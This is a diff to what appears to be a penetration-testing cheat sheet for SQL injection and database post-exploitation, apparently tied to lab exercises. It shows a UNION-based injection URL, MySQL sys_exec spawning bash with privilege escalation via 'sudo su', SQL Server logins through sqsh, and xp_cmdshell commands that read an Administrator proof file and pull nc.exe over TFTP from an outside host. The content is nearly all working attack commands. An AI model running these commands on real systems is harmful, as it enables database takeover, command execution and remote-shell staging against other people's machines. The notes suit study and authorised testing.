@@ -79,5 +79,28 @@ http://ptl-544ad5ad-8438986c.libcurl.so/cat.php?id=1 or 1=1 UNION SELECT 1,2,3,4
 Identify number of fields in select: here 1,2,3,4 doesn’t generate error
 
 
+## MySql
+
+````
+select sys_exec(‘/bin/bash’);
+after bash access, “bash –p” or “sudo su”
+````
 
 ##  SQL Server 
+
+Connect to:
+````
+sqsh -S hostname -Uusername -Ppassword
+use database;
+go
+select * from tblTable;
+go
+````
+
+If xp_cmdshell is enabled
+````
+exec master..xp_cmdshell 'type c:\"Documents and Settings"\Administrator\Desktop\proof.txt'
+go
+EXEC master..xp_cmdshell 'tftp -i 192.168.168.168 GET nc.exe'
+go
+````
